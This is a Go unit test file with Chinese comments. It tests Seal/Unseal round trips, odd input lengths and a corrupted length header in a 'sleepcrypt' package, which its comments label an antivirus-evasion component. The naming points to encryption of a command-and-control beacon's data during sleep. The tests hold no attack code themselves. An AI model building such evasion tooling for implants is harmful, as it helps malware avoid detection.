package sleepcrypt

// 免杀 R-1a 单测：Seal/Unseal 往返、密文异形、非对齐长度。
// linux/darwin 宿主上平台不支持 → 跳过（Windows CI/真机上全量执行）。

import (
	"bytes"
	"errors"
	"testing"
)

func skipIfUnsupported(t *testing.T, err error) {
	t.Helper()
	if errors.Is(err, ErrUnsupported) {
		t.Skip("sleepcrypt: platform not supported（linux/darwin 宿主，windows 真机执行）")
	}
}

func TestSealRoundtrip(t *testing.T) {
	plain := []byte("beacon-task-result-envelope-bytes-0123456789")
	cipher, err := Seal(plain)
	skipIfUnsupported(t, err)
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Equal(cipher, plain) {
		t.Fatal("密文不得等于明文（R-1a 红线）")
	}
	got, err := Unseal(cipher)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(got, plain) {
		t.Fatalf("往返不一致: got %q want %q", got, plain)
	}
}

func TestSealUnalignedSizes(t *testing.T) {
	for _, n := range []int{1, 7, 9, 33, 64} {
		plain := make([]byte, n)
		cipher, err := Seal(plain)
		if err != nil {
			skipIfUnsupported(t, err)
			t.Fatalf("size=%d: %v", n, err)
		}
		got, err := Unseal(cipher)
		if err != nil {
			t.Fatalf("size=%d unseal: %v", n, err)
		}
		if len(got) != n {
			t.Fatalf("size=%d 往返长度不符: %d", n, len(got))
		}
	}
}

func TestUnsealCorruptLengthHeader(t *testing.T) {
	cipher, err := Seal([]byte("payload"))
	skipIfUnsupported(t, err)
	if err != nil {
		t.Fatal(err)
	}
	corrupt := make([]byte, len(cipher))
	copy(corrupt, cipher)
	for i := 0; i < 8; i++ {
		corrupt[i] = 0 // 清零长度头
	}
	if _, err := Unseal(corrupt); err == nil {
		t.Fatal("损坏长度头应返回错误")
	}
}
